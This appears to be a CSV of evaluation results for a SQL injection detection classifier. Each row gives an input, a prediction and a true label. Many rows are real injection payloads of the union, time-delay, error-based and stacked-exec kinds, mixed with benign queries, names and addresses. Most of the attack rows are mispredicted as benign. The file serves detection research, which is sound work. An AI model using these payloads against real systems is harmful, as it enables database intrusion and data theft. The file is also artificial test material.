,Query,Prediction,Actual
329,SELECT * FROM  ( SELECT greatest FROM pink ) ,0,0.0
330,"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1.0
331,SELECT * FROM pictured WHERE shown = 'mix' FETCH FIRST 3 ROWS ONLY,0,0.0
332,SELECT * FROM complete WHERE ride NOT BETWEEN 'proper' AND 'fall',0,0.0
333, UPDATE cat SET brave = 'minerals'WHERE stiff = 'diameter',0,0.0
334,SELECT * FROM  ( SELECT driving FROM fighting ) ,0,0.0
335," SELECT column_name ( s )  FROM stretch,fall",0,0.0
336,"-4695'   )    )     )   union all select 5844,5844,5844,5844,5844,5844#",0,1.0
337,"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",0,1.0
338,"-1692'  )   union all select 7074,7074,7074,7074,7074,7074,7074#",0,1.0
339,1'  )   and 1987  =  3756#,0,1.0
340,"-1218' union all select 2663,2663,2663,2663--",0,1.0
341,1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,0,1.0
342,"1%""  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,1.0
343,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",0,1.0
344,-5534 or 1983  =  5721#,0,1.0
345,45699398p,0,0.0
346,petrie3@menorca.com.kp,0,0.0
347,"-9272%""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """,0,1.0
348,50344,0,0.0
349,SELECT * FROM customs FETCH FIRST 3 ROWS ONLY,0,0.0
350,SELECT * FROM design WHERE smoke  BETWEEN 10 AND 20,0,0.0
351,SELECT * FROM doll WHERE paragraph IN  ( SELECT seems FROM like ) ,0,0.0
352,SELECT * FROM still,0,0.0
353,SELECT * FROM read WHERE breathe = 'thus' FETCH FIRST 3 ROWS ONLY,0,0.0
354,1'  )   where 7478  =  7478,0,1.0
355,"  SELECT daughter,plural,human FROM slept LEFT JOIN Orders ON business.layID =  too.beside ORDER BY slip.upon",0,0.0
356,"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",0,1.0
357,SELECT TOP 3 * FROM spin WHERE below = 'form' SELECT * FROM origin,0,0.0
358,"-5125 union all select 5720,5720,5720,5720,5720,5720,5720,5720--",0,1.0
359,"c/ murillo, 106 5c",1,0.0
360,"1 and make_set  (  8403  =  8403,8899  )  ",0,1.0
361,SELECT DISTINCT attached FROM camp,0,0.0
362,"1' where 1230  =  1230 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1.0
363," SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM  ( Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID )  GROUP BY LastName HAVING COUNT ( Orders.OrderID )  > 10;",0,0.0
364," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",0,1.0
365," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",0,1.0
366,"1 and make_set  (  8403  =  8403,8899  )  # zysq",0,1.0
367,ayate,0,0.0
368, UPDATE tune SET alphabet = 'fought'WHERE spent = 'seed',0,0.0
369,yessica,0,0.0
370,ashberry,0,0.0
371,"1%""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""%""  =  """,0,1.0
372,SELECT * FROM roar,0,0.0
373,2epullo,0,0.0
374,SELECT * FROM leader WHERE aid NOT LIKE 'offer%',0,0.0
375,SELECT Count ( * )  AS remember,0,0.0
376,"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,1.0
377,SELECT morning ( s FROM skin RIGHT JOIN,0,0.0
378,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,0,1.0
379,9423,0,0.0
380,SELECT AVG ( various )  FROM stop  SELECT SUM ( women ) ,0,0.0
381,SELECT * FROM broke WHERE consider NOT LIKE 'electricity%',0,0.0
382,19224,0,0.0
383,levert,0,0.0
384,1   )    )     )   and 9575  =  1640--,0,1.0
385,santibez de bjar,0,0.0
386,4210,0,0.0
387,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""%""  =  """,0,1.0
388,valverde de alcal,0,0.0
389,"1,  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",0,1.0
390,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6631 )  ORDER BY meta_id ASC",0,0.0
391,"calle jose espejo, 130, 12?a",0,0.0
392,llombai,0,0.0
393,SELECT hungry ( s )  FROM special LEFT JOIN,0,0.0
394,76,0,0.0
395,SELECT * FROM center WHERE inch BETWEEN contrast09/01/1996your AND send15/31/1996week,0,0.0
396,SELECT * FROM essential WHERE    NOT enemy = 'gravity',0,0.0
397,"1""   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""lxue"" like ""lxue",0,1.0
398,"  UPDATE kitchen SET product =  'wait', City =  'favorite' WHERE bat =  everything",0,0.0
399,SELECT * FROM ship WHERE sea BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
400,alcoleja,0,0.0
401,SELECT * FROM made WHERE who = 'private'  OR driven = 'upper',0,0.0
402,SELECT distant ( s )  FROM establish UNION,0,0.0
403,1'  )   waitfor delay '0:0:5'--,0,1.0
404,SELECT * FROM son WHERE connected = 'live'  OR driven = 'proper',0,0.0
405,SELECT * FROM positive WHERE third = 'outline',0,0.0
406,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",0,1.0
407," SELECT column_name ( s )  FROM greatly,compare",0,0.0
408,1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,0,1.0
409,1  )   as zzip where 5353  =  5353 and 3394  =  3092,0,1.0
410,henry,1,0.0
411,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'fuvv'  =  'fuvv,0,1.0
412,19115,0,0.0
413,SELECT * FROM  ( SELECT eat FROM tin ) ,0,0.0
414,bride,0,0.0
415,06918701w,0,0.0
416,SELECT * FROM specific WHERE story = 'tax'  AND City = 'expect',0,0.0
417,SELECT * FROM  ( SELECT minerals FROM hand ) ,0,0.0
418,45810,0,0.0
419,SELECT * FROM before WHERE monkey NOT LIKE 'screen%',0,0.0
420,SELECT * FROM border FETCH FIRST 50 PERCENT ROWS ONLY,0,0.0
421,SELECT * FROM know WHERE go = 'entirely',0,0.0
422,-8023' in boolean mode  )   order by 1#,0,1.0
423,SELECT * FROM grain FETCH FIRST 3 ROWS ONLY,0,0.0
424,lima9za,0,0.0
425,borzani jordan,0,0.0
426,schaafsma@gay-tantra.sj,0,0.0
427,39696,0,0.0
428,8.34964E+15,0,0.0
429,"1""  )   where 6367  =  6367 union all select null,null,null,null,null,null,null#",0,1.0
430,SELECT TOP 50 PERCENT * FROM combination,0,0.0
431,1  )   as xtgr where 1545  =  1545,0,1.0
432,"1%""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""%""  =  """,0,1.0
433,SELECT COUNT ( featureID ) FROM jar,0,0.0
434,5988,0,0.0
435,SELECT * FROM everyone 3,0,0.0
436,nimia,0,0.0
437,37329,0,0.0
438,"1""   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""xccy""  =  ""xccy",0,1.0
439,SELECT * FROM again WHERE worth LIKE '%practice%',0,0.0
440,"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""azpb""  =  ""azpb",0,1.0
441,"1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1.0
442,38728859x,0,0.0
443, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  ',0,1.0
444,1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,0,1.0
445,97,0,0.0
446,19665853w,0,0.0
447,SELECT * FROM atmosphere,0,0.0
448,katsuno@novolardiseno.br,0,0.0
449,francisco jorquera s/n 1?d,0,0.0
450,"etorbidea nafarroa behereko, 162 6?d",0,0.0
451,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'lckw'  =  'lckw",0,1.0
452,hirn,0,0.0
453,SELECT * FROM principal WHERE case = 'poor',0,0.0
454,exec sp,0,1.0
455,-6129  )   as vuze where 1565  =  1565 or   (  8459  =  8459  )  *4906--,0,1.0
456,SELECT COUNT ( tinID ) FROM satisfied,0,0.0
457,"  SELECT moreID AS ID, studied AS social FROM movement",0,0.0
458,SELECT option_value FROM wp_options WHERE option_name  =  'ReduxFrameworkPlugin' LIMIT 1,0,0.0
459,60,0,0.0
460,SELECT * FROM tongue WHERE left = 'father' LIMIT 3,0,0.0
461,SELECT * FROM live,0,0.0
462,_bielda,0,0.0
463,SELECT * FROM wing WHERE sound = 'depth'  OR body = 'raw',0,0.0
464,1'+  (  select bfeq where 3445  =  3445 and 9198  =  9198--,0,1.0
465,1%'   )    )    and 4595  =  4595#,0,1.0
466,"SELECT option_name, option_value FROM wp_options WHERE autoload  =  'yes'",0,0.0
467,SELECT * FROM sing WHERE shot = 'build',0,0.0
468,1'   )    )     ) ,0,1.0
469,SELECT AVG ( noon ) FROM finger,0,0.0
470,SELECT COUNT ( DISTINCT century )  FROM mouth,0,0.0
471,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,1.0
472,1'   )    )    as egsj where 3447  =  3447,0,1.0
473,54368029p,0,0.0
474,SELECT * FROM square WHERE value BETWEEN '1996-07-01' AND '1996-07-31',0,0.0
475,SELECT face FROM captured UNION SELECT environment FROM night ORDER BY frequently,0,0.0
476,"c/ 57 15, 9g",0,0.0
477,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and '%'  =  '",0,1.0
478,yeste meloda,0,0.0
479,SELECT * FROM fine ORDER BY wrapped,0,0.0
480,1   )    )    as ctqr where 2609  =  2609,0,1.0
481,SELECT AVG ( Price ) FROM check,0,0.0
482,-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,0,1.0
483,"  SELECT occasionally,younger FROM mass WHERE thou = 'trip' UNION SELECT stretch, engineer FROM certain",0,0.0
484,SELECT * FROM planned,0,0.0
485,SELECT * FROM practice WHERE waste = 'board'  AND City = 'control',0,0.0
486,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",0,1.0
487,abordonar,0,0.0
488,DELETE FROM shallow WHERE develop = 'listen',0,0.0
489,"c/ alfara de algimia, 184",0,0.0
490,45256,0,0.0
491,-6984 order by 1#,0,1.0
492,SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,0,0.0
493,SELECT lion ( s )  FROM list UNION,0,0.0
494,SELECT * FROM its WHERE happen NOT LIKE '[truck]%',0,0.0
495,tennant4,0,0.0
496,SELECT MIN ( toy )  AS near FROM greatest,0,0.0
497,SELECT * FROM poem WHERE stage = 'happen' LIMIT 3,0,0.0
498,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",0,1.0
499,-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,0,1.0
500,alegre nomdedeu,0,0.0
501,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1.0
502," SELECT * FROM sets ORDER BY torn ASC, cat DESC",0,0.0
503,"1   )    )     )   union all select null,null,null,null,null#",0,1.0
504,SELECT * FROM south WHERE distance = 'temperature'  AND City = 'rope',0,0.0
505,SELECT COUNT ( park ) FROM hang,0,0.0
506,SELECT * FROM service ORDER BY connected,0,0.0
507,SELECT column_name ( s )  FROM table2; SELECT City FROM Customers,0,0.0
508,vilcu-verschuer@eddydaniele.kz,1,0.0
509,"1'||  (  select 'fzcu' where 9252  =  9252 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   ||'",0,1.0
510,SELECT COUNT ( author ) FROM bear,0,0.0
511,rapetto picabea,0,0.0
512,SELECT DISTINCT claws FROM gentle,0,0.0
513,"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0,0.0
514,SELECT * FROM cotton WHERE underline = 'took' LIMIT 3,0,0.0
515,"calle hernandez iglesias, 160,",0,0.0
516,"1'  )   as kbja where 4275  =  4275 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",0,1.0
517,SELECT MIN ( information )  AS fear FROM society,0,0.0
518,"-6595   )    )     )   union all select 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",0,1.0
519,angold@callofduty6.nu,0,0.0
520,SELECT TOP 3 * FROM straight WHERE soon = 'shinning' SELECT * FROM leave,0,0.0
521,"   SELECT A.CustomerName AS CustomerName1, B.CustomerName AS CustomerName2,    A.CityFROM Customers A, Customers BWHERE A.CustomerID <> B.CustomerID  AND A.City  =  B.City ",0,0.0
522,"-8454"" or 6872  =  6872",0,1.0
523,novalbos illarraga,0,0.0
524,22655130s,0,0.0
525,"   SELECT tip, half, drivingFROM physical WHERE usual  IS NOT NULL",0,0.0
526,"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
527,SELECT TOP 3 * FROM health WHERE somewhere = 'coal' SELECT * FROM fell,0,0.0
528,SELECT COUNT ( DISTINCT theory )  FROM stairs,0,0.0
529,cot reixach,0,0.0
530,chaurett,0,0.0
531,14638777j,0,0.0
532,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",0,1.0
533,"1""  )   as advz where 5166  =  5166 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",0,1.0
534,calle capitan palacios 71,0,0.0
535,"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f72e0bae01c0' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0,0.0
536,1'   )    )    as xcvg where 1157  =  1157 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,0,1.0
537,"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",0,1.0
538,derbyshi,0,0.0
539,3.5822E+15,0,0.0
540,"-4280%""   )    )     )   union all select 7981,7981--",0,1.0
541,"1' and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,1.0
542,6928,0,0.0
543,"1%"" and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1.0
544,"1   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,1.0
545,"1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'vfnl'  =  'vfnl",0,1.0
546,sqlvuln;,0,1.0
547,SELECT * FROM can ORDER BY most DESC,0,0.0
548,1%'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  '%'  =  ',0,1.0
549,quint,0,0.0
550,2161,0,0.0
551,winstanley@waterflyesp.hn,0,0.0
552,03nte99era,0,0.0
553,SELECT compound,0,0.0
554,SELECT SYSDATE (  ) ;,0,0.0
555,select case when 8227  =  1229 then 1 else null end--,0,1.0
556,"1"" where 3933  =  3933 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",0,1.0
557,SELECT TOP 3 * FROM yellow,0,0.0
558,aguinaga achutegui,1,0.0
559,-3520%' or 8571  =  8571--,0,1.0
560,angullo acosta,0,0.0
561,"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",0,1.0
562,konstanc,0,0.0
563,"INSERT INTO became  ( dark, complete, essential )  VALUES  ( 'freedom', 'wire', 'produce' )  ",0,0.0
564,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,0,1.0
565,SELECT * FROM discussion WHERE brass = 'stage'  AND  ( plural = 'men' OR gray = 'purple' ) ,0,0.0
566,SELECT came ( s )  FROM seed SELECT tobacco FROM sick,0,0.0
567,kato,0,0.0
568,23485,0,0.0
569,password:*/  =  1--,0,1.0
570,SELECT * FROM particularly WHERE field BETWEEN up09/01/1996eat AND interest15/31/1996branch,0,0.0
571,enaciado,0,0.0
572,89388462c,0,0.0
573,-8112'   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'xopg'  =  'xopg,0,1.0
574,1   )    )    as mcyh where 1001  =  1001,0,1.0
575,1   )    )    as vmwj where 5597  =  5597,0,1.0
576,9366,0,0.0
577,"c/ el breton, 187",0,0.0
578,pianka@noviasteresapalacios.mc,0,0.0
579,SELECT * FROM queen WHERE riding BETWEEN 'yet' AND 'excitement',0,0.0
580,SELECT Count ( * )  AS familiar,0,0.0
581,2719,0,0.0
582,SELECT * FROM plates WHERE who = 'crack' LIMIT 3,0,0.0
583,SELECT * FROM rather WHERE explain = 'known'  OR circus = 'thirty',0,0.0
584,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,0,1.0
585,-3859  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  5846  =  5846,0,1.0
